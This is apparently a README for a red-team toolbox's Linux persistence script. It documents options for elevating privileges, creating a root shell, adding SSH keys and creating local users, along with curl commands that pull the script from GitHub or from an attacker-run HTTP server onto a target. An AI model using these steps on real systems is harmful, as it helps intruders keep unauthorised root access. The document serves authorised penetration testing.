# Persistence Phase

Definition...  

Available parts:
- Elevate privileges
- Create a root shell
- Modify ssh keys
- Create local user

## Usage

```sh
# From github
curl -LJO https://github.com/McSquizzy/red-team-toolbox/blob/main/persistence/lin-persistence.sh
sh lin-persistence.sh -h
```
```sh
# Local network
# Host:
python -m SimpleHTTPServer 8000 #or
python3 -m http.server 8000
# Target:
curl -LJO <Host>:8000/lin-persistence.sh
sh lin-persistence.sh -h
```

### Parameters
```sh
sh lin-persistence.sh -h

Usage: sh lin-persistence.sh [-h] [-e] [-r] [-s] [-u] [-p]

-e <username>
  Elevate privileges of the given user
  Root needed!

-r
  Create a root shell
  Root needed!

-s <ssh public key / content of id_rsa.pub>
  Trying to add ssh public key to authorized_keys of current user

-u <username>
  Add a local account/user
  Root needed!

-p <password>
  Set this password to new user
  Only useful in combination with -u parameter
  Root needed!
```

## Results

The results are printed directly to STDOUT.

## Compatibility

The script uses /bin/sh syntax and is fully POSIX compatible so can run on most unix-based (POSIX/Unix/Linux) systems. 